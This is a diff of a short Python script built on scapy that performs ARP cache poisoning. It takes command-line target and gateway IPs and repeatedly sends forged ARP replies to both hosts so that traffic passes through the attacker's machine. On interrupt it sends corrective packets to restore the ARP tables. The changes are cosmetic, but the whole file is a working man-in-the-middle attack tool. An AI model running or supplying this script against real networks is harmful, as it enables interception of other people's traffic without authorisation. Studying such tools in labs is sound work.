@@ -3,7 +3,6 @@ import scapy.all as scapy
 import time
 import optparse
 
-
 def parsing():
     parser = optparse.OptionParser()
     parser.add_option("-t", "--target", dest="target_ip", help="The target IP address")
@@ -26,12 +25,12 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip, target_mac):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, count=4, verbose=False)
+    scapy.send(packet, verbose=False)
 
 
 def anti_Spoof(destination_ip, source_ip, destination_mac, source_mac):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
+    scapy.send(packet, count=4, verbose=False)  
 
 
 options = parsing()
@@ -46,9 +45,10 @@ try:
         spoof(target_ip, gateway_ip, target_mac)
         spoof(gateway_ip, target_ip, gateway_mac)
         count += 2
-        print("\r[+] Sent {0} Packets".format(str(count)),end=" ")  
+        print("\r[+] Sent {0} Packets".format(str(count)), end=" ")
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n\n[+] Quiting and Resetting ARP tables.....")
     anti_Spoof(target_ip, gateway_ip, target_mac, gateway_mac)
     anti_Spoof(gateway_ip, target_ip, gateway_mac, target_mac)
+    
